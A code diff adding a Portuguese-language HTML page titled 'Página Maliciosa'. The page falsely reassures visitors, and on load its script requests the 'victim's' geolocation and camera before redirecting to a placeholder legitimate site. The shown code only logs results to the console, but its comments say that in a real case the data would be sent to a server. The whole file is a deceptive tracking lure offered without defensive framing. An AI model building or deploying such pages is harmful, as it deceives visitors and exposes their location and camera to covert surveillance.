@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página Maliciosa</title>
+</head>
+<body>
+    <h1>Bem-vindo à nossa página!</h1>
+    <p>Você foi redirecionado aqui por um link legítimo.</p>
+
+    <script>
+        // Função para coletar a localização da vítima
+        function coletarLocalizacao() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Aqui, estamos apenas registrando as coordenadas no console
+                    console.log("Latitude: " + position.coords.latitude);
+                    console.log("Longitude: " + position.coords.longitude);
+                    // Em um caso real, os dados seriam enviados para um servidor, mas aqui estamos apenas exibindo no console
+                }, function(error) {
+                    console.log("Erro ao obter a localização", error);
+                });
+            } else {
+                console.log("Geolocalização não é suportada neste navegador.");
+            }
+        }
+
+        // Função para acessar a câmera da vítima
+        function acessarCamera() {
+            if (navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(function(stream) {
+                        // Aqui, estamos exibindo um aviso no console que a câmera foi acessada.
+                        console.log("Câmera acessada com sucesso!");
+                        // Em um cenário real, você poderia enviar os dados da câmera para um servidor, mas aqui estamos apenas exibindo uma mensagem.
+                    })
+                    .catch(function(err) {
+                        console.log("Erro ao acessar a câmera: " + err);
+                    });
+            } else {
+                console.log("Câmera não é suportada neste navegador.");
+            }
+        }
+
+        // Função de redirecionamento após a coleta de dados
+        function redirecionar() {
+            window.location.href = "https://www.site-legitimo.com"; // Substitua pelo link legítimo
+        }
+
+        // Executa as funções logo após o carregamento da página
+        window.onload = function() {
+            coletarLocalizacao(); // Coleta a localização da vítima
+            acessarCamera(); // Tenta acessar a câmera da vítima
+            setTimeout(redirecionar, 5000); // Aguarda 5 segundos antes de redirecionar
+        }
+    </script>
+</body>
+</html>
